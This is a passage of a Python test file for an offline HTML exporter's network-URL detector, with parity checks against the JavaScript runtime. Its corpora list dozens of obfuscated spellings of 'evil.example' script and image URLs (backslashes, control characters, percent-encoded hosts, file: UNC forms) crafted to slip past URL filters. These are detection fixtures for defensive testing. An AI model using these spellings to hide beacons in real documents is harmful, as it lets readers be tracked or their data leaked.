        ("\u00a0https://evil.example/x.js", False), ("\u2028//evil.example/x.js", False),
        ("\u3000//evil.example/x.js", False), ("\ufeff//evil.example/x.js", False),
        ("\u200b//evil.example/x.js", False),
        # not a network load: relative, rooted, fragment, data, another scheme, or the literal
        # buried after something that is not padding
        ("", False), ("svg-local-keep.js", False), ("./x.js", False), ("/root-relative.js", False),
        ("#anchor", False), ("data:text/javascript,void%200", False),
        ("mailto:someone@example.com", False), ("ftp://evil.example/x.js", False),
        ("x https://evil.example/x.js", False),
        # A single slash after a special scheme IS an authority to the URL parser, and a SCHEME-ONLY
        # spelling resolves to the same host: the special-authority states ignore whatever run of
        # slashes follows the colon, so `https:evil.example/x.js` and `https:/evil.example/x.js`
        # both fetch `https://evil.example/x.js` from a `file://` document. Both sides now read the
        # run rather than counting it (#961 moved the attribute predicate together with the CSS
        # gates and strips it mirrors), so a one-token spelling change no longer walks past them.
        ("https:/evil.example/x.js", True), ("https:evil.example/x.js", True),
        ("HTTPS:EVIL.EXAMPLE/x.js", True), ("https:///evil.example/x.js", True),
        ("https:/\tevil.example/x.js", True), ("http:evil.example", True),
        # ...but the run still has to be followed by a HOST. An authority terminated at once by
        # `?`, `#` or the end of the value is empty, which a special scheme fails to parse at all,
        # so a bare scheme is left alone rather than reported as a beacon.
        ("https:", False), ("https:?q", False), ("https:#f", False), ("https:/", False),
        # Case folding is ASCII-only on both sides: Python's `re.IGNORECASE` would otherwise fold
        # `s` onto U+017F, which a JS `/i` regex never does (and which no browser resolves as a
        # scheme either), so the gate would flag a value the strip keeps.
        ("http\u017f://evil.example/x.js", False), ("HTTP\u017f://evil.example/x.js", False),
        ("\u212a//evil.example/x.js", False),
        # Spellings the URL parser NORMALIZES into a network URL before it fetches, so both sides
        # must normalize before they test. A backslash opens an authority for a special scheme
        # exactly as a slash does, in either position (`https:/\evil.example/x.js` was verified
        # fetching https://evil.example/x.js in a real Chromium), and an ASCII tab, CR or LF is
        # removed from ANYWHERE in the input rather than only from the front.
        ("https:/\\evil.example/x.js", True), ("https:\\/evil.example/x.js", True),
        ("https:\\\\evil.example/x.js", True), ("\\\\evil.example/x.js", True),
        ("\\/evil.example/x.js", True), ("/\\evil.example/x.js", True),
        ("https:\n//evil.example/x.js", True), ("ht\ttps://evil.example/x.js", True),
        ("//evil.\rexample/x.js", True), ("/\t/evil.example/x.js", True),
        ("\u001f \\\\evil.example/x.js", True),
        # Trailing padding is stripped like leading padding. `https://` with a trailing space is the
        # row that pins it: with the trailing strip the value is an EMPTY authority and local, and
        # without it the space reads as the first character of a host.
        ("https://evil.example/x.js ", True), ("\u001fhttps://evil.example/x.js\u0000", True),
        ("https:// ", False), ("https://?q ", False), ("// ", False),
        # `file:` with an AUTHORITY is an off-machine load: on Windows it resolves to an SMB UNC
        # path, so it beacons exactly like an http one, and no `file://` document's CSP stops the
        # navigation it can carry. How many separators open that authority was CHECKED in a real
        # Chromium rather than read off the spec: two, or four-or-more, give a host from ANY base,
        # while THREE is the empty host of an ordinary local path. Those two are counted because they
        # are the BASE-INDEPENDENT set, not because no other spelling reaches a host - see the
        # zero/one-separator rows below and issue #1229.
        ("file://evil.example/x.js", True), ("FILE://evil.example/x.js", True),
        ("file:\\\\evil.example/x.js", True), ("file:////evil.example/x.js", True),
        ("file://///evil.example/x.js", True), ("file:///\\evil.example/x.js", True),
        # ...but the `file:` spellings that stay on the machine are not. A third slash means an
        # EMPTY host, `localhost` is the local machine by definition, and a Windows DRIVE LETTER is
        # turned into a path rather than a host by the file-host state - `file://C:/x` is the same
        # local file as `file:///C:/x`, and it is the spelling Windows tools paste. Reporting any of
        # them would delete an author's local reference and reject a file with no egress at all.
        # The FIVE-slash rows pin the backtracking guard: a greedy `/{4,}` alone gives a slash back
        # when a lookahead fails and then matches on the four-slash reading, so these came out
        # network until the run was made unbacktrackable.
        ("file:///C:/local/x.js", False), ("file:///x.js", False),
        ("file://localhost/x.js", False), ("file://localhost", False),
        ("file:////localhost/x.js", False), ("file://C:/local/x.js", False),
        ("file://c|/local/x.js", False), ("file://C:\\local\\x.js", False),
        ("file:////C:/local/x.js", False), ("file://", False), ("file://?q", False),
        ("file://///localhost/x.js", False), ("file://///C:/local/x.js", False),
        ("file://///c|/local/x.js", False), ("file://///?q", False), ("file://///", False),
        ("file://////localhost/x.js", False),
        # A real Chromium resolves EVERY `file://` authority that STARTS with a drive letter to a
        # local drive path with an EMPTY host, separator or no separator, so what looks like a host
        # after one is really a path segment.
        ("file://C:foo/x.js", False), ("file://c|foo", False), ("file://a:8080/x.js", False),
        ("file://c:evil.example/x.js", False), ("file:////C:foo/x.js", False),
        # A PERCENT-ENCODED `localhost` is the same local file, because the URL parser percent-decodes
        # a file host and lowercases it BEFORE the file-host state compares it (checked in a real
        # WHATWG parser: `file://local%68ost/x` parses to href `file:///x` with an empty host). A
        # literal `localhost` test therefore deleted an author's local reference and left the gate
        # rejecting a file with no egress at all. Both hex ROWS are covered, since `%4c` decodes to
        # `L` and domain-to-ASCII lowercases it, and a `/i` regex folds `%6c` onto `%6C` but never
        # onto `%4c`.
        ("file://local%68ost/x.js", False), ("file://%6Cocalhost/x.js", False),
        ("file://%4cocalhost/x.js", False), ("file://LOCALHOS%54/x.js", False),
        ("file://localhos%74", False), ("file://%6c%6F%43%41%4c%68%4F%53%74/x.js", False),
        # The COMPLEMENTARY hex case for every letter. Without this row four of the nine per-letter
        # classes are pinned on one row only: a mutation run confirmed that narrowing `%[46]8`,
        # `%[46]3`, `%[46]1` or `%[57]3` to a single row produced ZERO corpus mismatches, so the
        # change's own "both hex rows per letter" claim went untested for `h`, `c`, `a` and `s`.
        ("file://%4C%4F%63%61%4C%48%6F%73%54/x.js", False),
        ("file:////local%68ost/x.js", False), ("file://///local%68ost/x.js", False),
        # ...but only when the whole host decodes to exactly `localhost`. `%2F` and `%00` are
        # forbidden host code points (both were checked failing to parse), and a decoded host that
        # merely STARTS with `localhost` is a different machine, so all three keep the network
        # verdict - the exclusion can never be used to smuggle a host past the gate.
        ("file://localhost%2Fevil.example/x.js", True), ("file://localhost%00/x.js", True),
        ("file://local%68ostx/x.js", True), ("file://%68ost/x.js", True),
        # A TRAILING DOT is deliberately NOT excluded, and that is the parser-faithful reading rather
        # than an accepted over-detection: the file-host state special-cases the exact string
        # `localhost`, and `localhost.` is not it, so `file://localhost./x` keeps a NON-EMPTY host
        # (checked: href stays `file://localhost./x`) and on Windows resolves to the SMB path
        # `\\localhost.\x`. That is the same call the `\\localhost\C$\x` row below makes - an
        # authority-bearing share is egress even to the loopback - so excluding it would be the
        # inconsistency. The percent-encoded spellings of the dot and of the host agree.
        ("file://localhost./x.js", True), ("file://localhost.", True),
        ("file://localhost%2E/x.js", True), ("file://%6Cocalhost./x.js", True),
        ("file:////localhost./x.js", True), ("file://///localhost./x.js", True),
        # A SECOND slash after the host is not a local path - it is the four-separator UNC form
        # wearing a `localhost` disguise. The host is emptied and `//not-a-host/x.js` stays as the
        # PATH, so the value canonicalizes to `file:////not-a-host/x.js` (checked in a
        # spec-conformant WHATWG parser; Chromium 149 instead KEEPS host `localhost` for that exact
        # spelling, and re-parsing the canonical form is what reaches host `not-a-host`, so counting
        # it is the fail-CLOSED reading either way), which the rows
        # above already reject. A DOT SEGMENT reaches the same place from further along the path -
        # `/.//x.js` and `/a/..//x.js` both canonicalize to `file:////x.js`, and a `..` inside the
        # four-separator form pops the `localhost` segment itself out - so every spelling of a
        # double-dot segment the parser recognizes is here. A bare `[/?#]` terminator called all of
        # these LOCAL on both sides, which is an egress MISS, the dangerous direction.
        ("file://localhost//not-a-host/x.js", True),
        ("file://local%68ost//not-a-host/x.js", True),
        ("file://localhost/\\not-a-host/x.js", True),
        ("file:////localhost//not-a-host/x.js", True),
        ("file://localhost/.//x.js", True), ("file://localhost/a/..//x.js", True),
        ("file://localhost/%2e//x.js", True), ("file://localhost/a/%2E%2e//x.js", True),
        ("file://localhost/a/.%2e//x.js", True), ("file://local%68ost/.//x.js", True),
        ("file:////localhost/../not-a-host/x.js", True),
        # ...and the same class reaches the predicate from a value the separator arms never look at:
        # a THREE-slash or slash-less `file:` URL whose path canonicalizes onto the leading `//`.
        # `file:///..//x.js` and `file:/a/..//x.js` both become `file:////x.js`, and
        # `file:////C:/../x.js` pops the DRIVE LETTER the other exclusion matched. So an empty path
        # segment is its own arm and a double-dot segment overrides both exclusions.
        ("file:///..//x.js", True), ("file:/..//x.js", True), ("file:///.//x.js", True),
        ("file:////C:/../x.js", True), ("file://///C:/.%2e/x.js", True),
        # The cost of that, recorded rather than hidden: each of these canonicalizes to something
        # LOCAL and is now over-reported. Fail-CLOSED is the trade this predicate takes everywhere
        # else, and the spellings are absurd; pinning them here is what keeps the trade from silently
        # growing or shrinking on one side. The controls beside them must stay local - a single dot
        # segment cannot reduce into a leading `//` on its own, and a `//` after `?` is in the query,
        # which cannot change the path.
        ("file://localhost//C:/local/x.js", True), ("file://localhost//", True),
        ("file://localhost/a/../x.js", True), ("file://localhost/a//b.js", True),
        ("file:///C:/a//b.png", True), ("file://localhost/...//x.js", True),
        ("file://localhost/not-a-host/x.js", False), ("file://localhost/a/./b.js", False),
        ("file://localhost/a/b/c.js", False), ("file://localhost/x.js?q//h", False),
        ("file:///C:/local/a.js", False), ("file:///local/a/b.js", False),
        # An IDNA/UTS-46-mapped spelling is an ACCEPTED, deliberate over-detection: each of these
        # parses to href `file:///x.js` with an empty host (measured), so a browser reads them as the
        # same local file, and both predicates still call them network. Modelling UTS-46 in a regex
        # the two engines agree on is not possible - and Python's `re.IGNORECASE` folds `s` onto
        # U+017F where a JS `/i` never does, so ATTEMPTING it is how they drift - and over-detecting
        # costs a rare reference while under-detecting is a beacon the gate blesses. Pinned here so
        # the boundary cannot move on one side only, and so dropping `re.ASCII` (which would fold the
        # bare `s` onto U+017F in Python alone) goes red instead of drifting silently.
        ("file://\uff4cocalhost/x.js", True), ("file://%EF%BD%8Cocalhost/x.js", True),
        ("file://LOCALHO\u017FT/x.js", True), ("file://local%C2%ADhost/x.js", True),
        # A SINGLE leading slash or backslash is a path, not an authority, and a backslash deeper
        # inside a relative reference leaves it relative. The `file:x.js` and `file:/x.js` rows are
        # the ZERO- and ONE-separator controls: parsed ABSOLUTE, Chromium 149 gives both the host
        # `x.js`, but against the `file:` base a document actually has they inherit that base's host
        # and are local, so they carry no authority of their own and are deliberately not counted.
        # Issue #1229 SETTLED that bound (see the rows and reasoning below); a widening that counted
        # them would flip these two rows.
        ("\\relative\\x.js", False), ("/root\\relative.js", False), ("file:x.js", False),
        ("file:/x.js", False),
        # ZERO and ONE separator after `file:` have a LEADING RUN THAT IS PATH on both sides, and
        # that is MEASURED rather than an omission in the separator arithmetic above (issue #1229).
        # `file:` IS a special scheme, so `normalize_url_value`'s backslash mapping applies to it
        # identically and `file:\\evil.example/x.js` above is counted; what `file:` does not take is
        # the special-authority-(ignore-)slashes states that make the slash-less `https:host/x` a
        # real host. The scheme state routes it to the FILE state, which resolves against the
        # document's BASE. In a real Chromium (a Windows and a Linux build), from a
        # `file:///C:/dir/report.html` document and through `<a href>`, `<img src>` and a captured
        # `meta http-equiv=refresh` NAVIGATION alike, `file:evil.example/x` resolves to
        # `file:///C:/dir/evil.example/x` and `file:/evil.example/x` to `file:///C:/evil.example/x`
        # - both EMPTY-host local paths. What makes them look like an authority is a BASE-LESS
        # `new URL(value)` parse, which nothing in a document performs. The counted two- and
        # four-separator controls sit right beside them so the boundary cannot be moved on one side
        # only, and the benign `file:notes.html` row is the false positive that counting the leading
        # run would create: reporting it would make the gate refuse a file with no egress at all and
        # the exporter DELETE the author's reference. Only the LEADING run is exempt - the last two
        # rows are slash-poor values whose PATH canonicalizes onto the four-separator form, so the
        # `..` and empty-segment arms still count them, and they are pinned here because no
        # zero-separator-with-`//`-in-path row existed on either side. The two after them pin the
        # same override against the `localhost` and DRIVE-LETTER exclusions: those lookaheads live
        # INSIDE the authority arm, so a slash-poor spelling reaches the empty-segment arm
        # regardless of them - which also means the `file:localhost/x.js` and `file:C:/local/x.js`
        # rows above are local because their LEADING RUN is path, not because either lookahead
        # fired. `tests/49-offline-export.spec.js`
        # re-runs the measurement in a real engine on every CI pass.
        ("file:evil.example/x", False), ("file:/evil.example/x", False),
        ("FILE:evil.example/x", False), ("file:\\evil.example/x", False),
        ("file:notes.html", False), ("file:sub/dir/img.png", False),
        ("file:localhost/x.js", False), ("file:localhost./x.js", False),
        ("file:C:/local/x.js", False), ("file:/C:/local/x.js", False),
        ("file://evil.example/x", True), ("file:////evil.example/x", True),
        ("file:a//b.png", True), ("file:evil.example//x.png", True),
        ("file:localhost//x.js", True), ("file:C://x.js", True),        # An authority terminated at once by `?`, `#` or the end of the value is an EMPTY host,
        # which nothing fetches from: a special scheme fails to parse outright (checked in a real
        # Chromium), and from a `file:` document it is the local root. The third of these is the
        # Windows extended-length path `\\?\C:\x`, which the backslash mapping turns into `//?/C:/x`.
        ("//", False), ("//?q", False), ("//#f", False), ("https://", False),
        ("https://?q", False), ("\\\\?\\C:\\x", False),
        # ...but a host of `.` (the Windows device path `\\.\C:\x`) really does parse to a host, and
        # a loopback SMB share is still egress off the document, so both stay flagged. Note that
        # `\\localhost\C$\x` is True while `file:////localhost/x.js` is False: the backslash spelling
        # normalizes to a scheme-relative `//localhost/...` and is judged by the http/https arm,
        # which deliberately carries NO `localhost` exclusion - an authority-bearing UNC share is
        # egress even to the loopback, while the direct `file://localhost/...` spelling is the
        # ordinary way to name a local file and stays local.
        ("\\\\.\\C:\\x", True), ("\\\\localhost\\C$\\x", True),
        # Every OTHER authority-bearing scheme reads LOCAL on both sides, and that boundary is
        # EVIDENCE rather than an omission: from a `file:` document a real Chromium produces no
        # connection at all for any of these, through any attribute or CSS channel the strip covers
        # (`net::ERR_UNKNOWN_URL_SCHEME` for `ftp:`/`ws:`/`wss:`/a custom scheme with no registered
        # handler - Chromium removed FTP in 88 and `fetch("ftp://...")` throws `URL scheme "ftp" is
        # not supported` - and `Not allowed to load local resource` for `filesystem:`), while the
        # http and https controls in the same document connect. The measurement is re-run on every
        # CI pass by the `CMH-OFFLINE-04: no authority-bearing scheme but http and https loads from
        # a file: document` spec, which gives the CONTROL one raw TCP listener per channel - so a
        # channel that is dead by construction cannot hand every candidate a free zero - and each
        # candidate one listener for all channels together. So widening either predicate would buy
        # no egress protection and would cost real content: the exporter would DELETE an author's
        # reference and the gate would reject a file with no egress at all - the same
        # over-detection trade the `localhost` and drive-letter exclusions above already record.
        # These rows exist so the two engines can never drift APART on the boundary either, and so a
        # deliberate future widening has to move both sides at once.
        # The slash-run and backslash spellings are carried too, because `ws:`/`wss:`/`ftp:` are
        # SPECIAL schemes to the URL parser exactly as `https:` is, so `ws:host/x` and
        # `ftp:\\host\x` normalize the same way the http rows above do - which is precisely how a
        # half-widened predicate would first show up.
        # `ftp://evil.example/x.js` itself is already a row above (it predates this block, from when
        # the boundary was recorded without evidence), so only the spellings the URL parser
        # normalizes are added here rather than repeating it.
        ("FTP://EVIL.EXAMPLE/x.js", False),
        ("ftp:evil.example/x.js", False), ("ftp:/evil.example/x.js", False),
        ("ftp:\\\\evil.example\\x.js", False), ("ftp:///evil.example/x.js", False),
        ("ws://evil.example/x.js", False), ("wss://evil.example/x.js", False),
        ("WS://EVIL.EXAMPLE/x.js", False), ("ws:evil.example/x.js", False),
        ("wss:/evil.example/x.js", False), ("ws:\\\\evil.example\\x.js", False),
        ("\u001f wss://evil.example/x.js", False), ("w\tss://evil.example/x.js", False),
        ("filesystem:https://evil.example/temporary/x.js", False),
        ("filesystem:http://evil.example/persistent/x.js", False),
        ("gopher://evil.example/x.js", False), ("x-cmh-probe://evil.example/x.js", False),
        ("custom-scheme://evil.example/x.js", False),
        # The near-miss controls for those rows, and they are controls rather than decoration: each
        # expects TRUE, so a regression that stopped matching the http/https or scheme-relative arm
        # fails here. An inert scheme NAME appearing as a HOST or inside a path leaves the value
        # judged by those arms, and a scheme that merely ends in an inert name is not that scheme.
        ("//ws.evil.example/x.js", True), ("//ftp.evil.example/x.js", True),
        ("https://ftp.evil.example/x.js", True),
        ("https://evil.example/ws://x.js", True), ("notftp://evil.example/x.js", False),
    ]

    # `srcset` is the one attribute whose value is a LIST, so the candidate boundary is decided
    # before the URL predicate ever sees a value - and HTML's parser draws that boundary at ASCII
    # whitespace only (tab, LF, FF, CR, space). Tokenizing with the engine's own whitespace both
    # HID a real load from both sides (U+000B is engine whitespace but not ASCII whitespace, so the
    # candidate was cut there) and drifted between the engines (Python's `str.strip()` takes
    # U+001C-U+001F, JS's `trim()` takes U+FEFF). Pinned with expected verdicts for the same reason
    # as the corpus above.
    _SRCSET_CORPUS = [
        ("local.png 1x, local-2x.png 2x", False),
        ("https://evil.example/x.png 1x", True),
        ("local.png 1x, //evil.example/x.png 2x", True),
        ("https:/\\evil.example/x.png 1x", True),
        ("file://evil.example/x.png 1x", True),
        ("\u0001\u000b//evil.example/x.png 1x", True),
        ("\u001f\u000b//evil.example/x.png 1x", True),
        ("\t\ufeff//evil.example/x.png 1x", False),
        ("\ufeffhttps://evil.example/x.png 1x", False),
        ("   \t local.png   1x  ", False),
        # A candidate whose only unusual character is U+001C: the VERDICT is the same either way, so
        # this row exists for the TOKEN comparison below - Python's old `str.strip()`/`str.split()`
        # cut it into three tokens where HTML keeps one, and only comparing the tokenizers' OUTPUT
        # catches a revert on the Python side.
        ("a\u001cb.png 1x", False), ("\u000b//evil.example/x.png 1x", True),
        # A comma INSIDE the URL run: HTML collects the whole run, so this really does request
        # `https://,evil.example/x.png` (measured in a real Chromium), while a comma-split alone
        # tests the truncated `https://` - an empty authority, and local.
        ("https://,evil.example/x.png 1x", True), ("//,evil.example/x.png 1x", True),
        ("file://,evil.example/x.png 1x", True),
        # ...and two candidates separated by a comma with no space around it, which the
        # whitespace-run reading alone would join into one non-matching token.
        ("local.png 1x,https://evil.example/x.png 2x", True),
        ("", False), (",", False), ("   ", False),
        ("data:image/gif;base64,R0lGODlhAQABAAAAACw= 1x", False),
        (",local.png 1x,", False), ("local.png 1x 2x, local-2.png 100w", False),
        # The case the old two-reading UNION got wrong (issue #1084). A `data:` URL may legally
        # CONTAIN a comma - it separates the media type from the data - so the comma-split arm cut
        # this ONE candidate into `data:text/plain` and `https://example.com/payload`, and the
        # second half matched the network predicate. Fail-CLOSED (an over-strip and an
        # over-rejection, never a missed load), but it made an offline export clear a `srcset` that
        # reaches no network and the strict validator reject a document with no egress.
        ("data:text/plain,https://example.com/payload 1x", False),
        ("local.png 1x, data:text/plain,//evil.example/x.png 2x", False),
        # A candidate run that ENDS in commas takes no descriptors at all: HTML strips them and
        # starts the next candidate, so the network URL after them is still its own candidate.
        ("local.png,, https://evil.example/x.png 1x", True),
        # A comma inside a PARENTHESISED descriptor does not end the candidate, so what follows it
        # is descriptor text and not a URL. Reading it as a separator invents a candidate.
        ("local.png (a,https://evil.example/x.png) 1x", False),
        ("local.png (a,b) 1x, https://evil.example/x.png 2x", True),
        # HTML's descriptor tokenizer has TWO states, not a nesting DEPTH: a single `)` leaves the
        # paren state however many `(` preceded it, so the comma after it IS a separator and the
        # run that follows is a real candidate - Chromium fetches `https://.../x.png)`, trailing
        # paren and all, so a depth counter here would be a MISSED load, not a tightening.
        ("local.png (a(b), https://evil.example/x.png) 1x", True),
        # ...and an UNCLOSED `(` runs to EOF, so nothing after it is a candidate. Measured: a real
        # Chromium loads nothing at all from this value.
        ("local.png (1x, https://evil.example/x.png 2x", False),
        # Descriptor VALIDATION is deliberately not implemented (see `srcset_candidate_urls`): HTML
        # DISCARDS a candidate whose descriptors do not parse, so Chromium fetches nothing from
        # either of these, while both sides here report the load. That over-detection is the
        # fail-closed direction and is pinned so a later "fix" toward browser fidelity is a
        # deliberate decision rather than an accident.
        ("https://evil.example/x.png 1x 2x", True), ("https://evil.example/x.png nope", True),
    ]

    # The VERDICT corpus above cannot see a tokenization that both engines got wrong the same way -
    # a union that over-splits agrees with itself. These rows pin the candidate list ITSELF against
    # what HTML's srcset parser collects, so a revert to the union reds this even though the two
    # sides would still match each other.
    _SRCSET_TOKEN_CORPUS = [
        ("data:text/plain,https://example.com/payload 1x",
         ["data:text/plain,https://example.com/payload"]),
        ("local.png 1x, local-2x.png 2x", ["local.png", "local-2x.png"]),
        ("local.png 1x,https://evil.example/x.png 2x", ["local.png", "https://evil.example/x.png"]),
        ("https://,evil.example/x.png 1x", ["https://,evil.example/x.png"]),
        ("local.png,, https://evil.example/x.png 1x", ["local.png", "https://evil.example/x.png"]),
        ("local.png (a,https://evil.example/x.png) 1x", ["local.png"]),
        ("local.png (a(b), https://evil.example/x.png) 1x",
         ["local.png", "https://evil.example/x.png)"]),
        ("x.png ((),https://evil.example/y.png 1x", ["x.png", "https://evil.example/y.png"]),
        ("local.png (1x, https://evil.example/x.png 2x", ["local.png"]),
        # Every character of the ASCII-whitespace set, so the boundary is EXERCISED as well as
        # compared: `\f`, `\r` and `\n` appear nowhere else in either corpus.
        ("a.png\f1x,b.png\r2x,c.png\n3x", ["a.png", "b.png", "c.png"]),
        # A URL run that ends in a comma takes NO descriptors, so the next token really is the next
        # candidate's URL - here a bare descriptor becomes one. HTML-faithful and easy to mistake
        # for a bug, so it is pinned before someone "fixes" it into swallowing the URL after it.
        ("local.png, 1x, https://evil.example/x.png 2x",
         ["local.png", "1x", "https://evil.example/x.png"]),
        (",local.png 1x,", ["local.png"]),
        (",,  ,,", []), ("", []),
        ("a.png,b.png 1x", ["a.png,b.png"]),
    ]

    def _runtime_network_url_source(self):
        """The exporter's whole network-URL decision, as JS source, for evaluation in node.

        Extracted as one contiguous region rather than as the bare regex literal: the decision is
        the URL parser's input cleanup, the literal test, and the `srcset` candidate boundary, and
        reading only the pattern would keep passing after any of the others drifted - the very drift
        this parity test exists to catch.
        """
        source = self._read("68-export-offline.js")
        start = source.find("function _offlineNormalizeUrlValue(")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines _offlineNormalizeUrlValue; the parity "
                            "extraction is stale and must be re-pointed at whatever replaced it")
        end = source.find("function _offlineSrcsetHasNetwork(", start)
        self.assertNotEqual(end, -1,
                            "the runtime no longer defines _offlineSrcsetHasNetwork after the "
                            "normalizer; the parity extraction is stale")
        end = source.find("\n}", end)
        self.assertNotEqual(end, -1, "could not find the end of _offlineSrcsetHasNetwork")
        region = source[start:end + 2]
        for name in ("_OFFLINE_PCT_LOCALHOST", "_offFileNetworkArm",
                     "_OFFLINE_NETWORK_URL_RE", "_offlineIsNetworkUrl",
                     'const _OFFLINE_SRCSET_WS = "',
                     "_offlineSrcsetCandidateUrls"):
            self.assertIn(name, region,
                          "%s is no longer inside the extracted network-URL region, so the parity "
                          "check would run a partial copy of the decision" % name)
        # A region that stopped early (a helper inserted between the two anchors whose body ends in
        # a column-0 `}`) would evaluate a TRUNCATED predicate, so require it to close cleanly AND
        # to be the LAST closing brace in the file's own extraction window - `endswith("}")` alone
        # is satisfied by any column-0 brace, including one inside the function.
        self.assertTrue(region.rstrip().endswith("}"),
                        "the extracted network-URL region does not end at a closing brace, so the "
                        "parity check would evaluate a truncated copy of the decision")
        self.assertEqual(region.count("function _offlineSrcsetHasNetwork("), 1,
                         "the extracted region does not carry exactly one _offlineSrcsetHasNetwork "
                         "definition, so the parity check would run a partial copy")
        self.assertEqual(region.count("{") - region.count("}"), 0,
                         "the extracted network-URL region has unbalanced braces, so it was cut "
                         "mid-function and the parity check would evaluate a truncated copy")
        return region

    def _js_string_literal(self, js_name, literal):
        """The VALUE of a JS double-quoted literal, with its escapes decoded.

        Decoded rather than read raw, because a regex source carries backslashes: the JS literal
        `"\\\\."` is the two characters `\\.`, and comparing the raw source text to the Python
        pattern would report a drift that is not there (or, worse, hide one that is).
        """
        try:
            return json.loads(literal)
        except ValueError:
            self.fail("the runtime's %s carries a string escape this parity check cannot decode "
                      "(%r); JSON-compatible escapes keep the two sides comparable"
                      % (js_name, literal))

    def test_the_python_and_js_localhost_host_patterns_are_textually_identical(self):
        """Pin the shared `localhost` sub-patterns as TEXT, not only by their verdicts.

        The corpus below proves the two predicates AGREE on the values it carries, which is not the
        same as proving they are the same pattern: a per-letter hex class that drifted on one side
        only shows up on a spelling the corpus happens to list, and a nine-character alternation has
        far more spellings than any corpus can carry. The repo already draws this distinction for the
        navigation patterns (`test_the_python_and_js_scripted_navigation_patterns_agree`), and the
        same reasoning applies here: hand-copied literals in two languages need a byte-for-byte pin.
        Both halves are pinned - the host spelling and the terminator that decides what may follow it
        - because a drift in either is a CMH-OFFLINE-04 failure (the terminator is what keeps
        `file://localhost//evil.example/x.js` egress on both sides).
        """
        source = self._read("68-export-offline.js")
        for js_name, py_value in (("_OFFLINE_PCT_LOCALHOST", resources._PCT_LOCALHOST),
                                  ("_OFFLINE_FILE_DOTDOT_SEGMENT", resources._FILE_DOTDOT_SEGMENT),
                                  # The CSS value TERMINATOR set, which decides what may follow a
                                  # host for the `localhost` and drive-letter exclusions to fire in
                                  # a stylesheet. A corpus cannot pin it either: dropping `{` from
                                  # one side keeps every row's verdict and only shows up on a
                                  # spelling nobody listed.
                                  ("_OFF_CSS_VALUE_STOP", resources.CSS_VALUE_STOP),
                                  # The srcset candidate BOUNDARY rests entirely on this five-
                                  # character set, and a corpus cannot pin it: a row only exercises
                                  # the characters it happens to carry, so dropping `\f` from one
                                  # side (or both) would keep every verdict and every token list
                                  # intact. Comparing the VALUE is the only check that sees it.
                                  ("_OFFLINE_SRCSET_WS", resources._SRCSET_WS)):
            # The body is lazy up to a `;` at END of line, not "anything but a `;`": a pattern that
            # legitimately contained a semicolon would otherwise be extracted as a prefix and
            # compared as if the rest were missing.
            m = re.search(r"^const %s =\n?((?:.|\n)+?);$" % re.escape(js_name),
                          source, re.MULTILINE)
            self.assertIsNotNone(
                m, "the runtime no longer defines %s as a single const initializer; the parity "
                   "extraction is stale and must be re-pointed at whatever replaced it" % js_name)
            initializer = m.group(1).strip()
            # The initializer must be string LITERALS joined by `+` and nothing else. Reading the
            # quoted fragments alone would let a `+ someVariable` change the runtime pattern while
            # this assertion still passed on the literal half - a drift the test exists to catch.
            self.assertRegex(
                initializer, r'^"(?:[^"\\]|\\.)*"(?:\s*\+\s*"(?:[^"\\]|\\.)*")*$',
                "the runtime's %s is no longer a concatenation of plain string literals (%r), so "
                "reading its literals would compare only part of the pattern" % (js_name, initializer))
            js_value = "".join(
                self._js_string_literal(js_name, lit)
                for lit in re.findall(r'"(?:[^"\\]|\\.)*"', initializer))
            self.assertTrue(
                js_value, "could not read any string literal out of the runtime's %s" % js_name)
            # Compared in the PYTHON -> JS direction, and only for `\Z`: Python's `$` also matches
            # before a trailing newline where a JS `$` matches only at the end of input, so the two
            # spellings are equivalent exactly when every Python `\Z` is a JS `$`. Going the other
            # way (replacing `$` with `\Z`) would also rewrite a `$` that a future edit put inside a
            # character class or escaped, and would silently bless it.
            self.assertEqual(
                py_value.replace(r"\Z", "$"), js_value,
                "the runtime's %s and the validator's copy are not the same pattern (%r vs %r). "
                "Matching verdicts over the corpus cannot see a drift on a spelling the corpus "
                "does not carry, so this is the assertion that keeps the two provably in step."
                % (js_name, js_value, py_value))

    def test_the_python_and_js_file_authority_arms_are_textually_identical(self):
        """Pin the SHARED `file:` arm itself, for every `stop` its callers use.

        The arm is no longer a constant either side can be diffed as text (it is built from a `stop`
        parameter so one definition can serve an attribute value and a CSS value), so the pin has to
        run the runtime's own builder and compare what it PRODUCES. That is strictly stronger than
        the two constants it replaced: it covers the separator arithmetic, both exclusions, the
        non-empty-authority rule and the two canonicalization arms in one comparison, for BOTH the
        attribute stop (empty) and the CSS one. A drift here is the CMH-OFFLINE-04 failure mode in
        the shape issue #1230 found - a channel one side calls egress and the other cannot see.
        Skipped when node is absent, like the other cross-engine guards.
        """
        node = shutil.which("node")
        if not node:
            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
        stops = ["", resources.CSS_VALUE_STOP]
        script = (
            self._runtime_network_url_source() + "\n"
            + "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
            "const p=JSON.parse(raw);process.stdout.write(JSON.stringify("
            "p.stops.map(s=>_offFileNetworkArm(s))));});"
        )
        proc = subprocess.run([node, "-e", script], input=json.dumps({"stops": stops}),
                              capture_output=True, text=True, encoding="utf-8")
        self.assertEqual(proc.returncode, 0,
                         "node could not evaluate the shared file: arm builder: %s" % proc.stderr)
        arms = json.loads(proc.stdout)
        self.assertEqual(len(arms), len(stops),
                         "node returned %d arms for %d stops" % (len(arms), len(stops)))
        for stop, js_arm in zip(stops, arms):
            # Compared in the PYTHON -> JS direction, and only for `\Z`, for the reason the
            # constant pin above gives: Python's `$` also matches before a trailing newline.
            self.assertEqual(
                resources.file_network_arm(stop).replace(r"\Z", "$"), js_arm,
                "the runtime's _offFileNetworkArm(%r) and the validator's file_network_arm are not "
                "the same pattern (%r vs %r). Matching verdicts over the corpus cannot see a drift "
                "on a spelling the corpus does not carry."
                % (stop, js_arm, resources.file_network_arm(stop)))

    # Every `file:` spelling below gets ONE verdict, whichever gate is asked. That is the property
    # issue #1230 was: `NETWORK_URL_RE` called `file://evil.example/x.png` an off-machine SMB load
    # while the CSS readers beside it - which had no `file:` arm at all - called it local, so a
    # shareable document carrying it in a stylesheet earned the `commentable-html-validated` stamp
    # and beaconed on open. Asserting AGREEMENT rather than a per-gate expectation is what makes
    # this hold as the predicate evolves: a future widening of the attribute arm that forgot one of
    # the CSS readers fails here even on a spelling nobody thought to list.
    _FILE_AUTHORITY_VERDICTS = [
        ("file://evil.example/x.png", True),
        ("file:////evil.example/x.png", True),
        ("file://localhost//not-a-host/x.png", True),
        ("file:////localhost/../not-a-host/x.png", True),
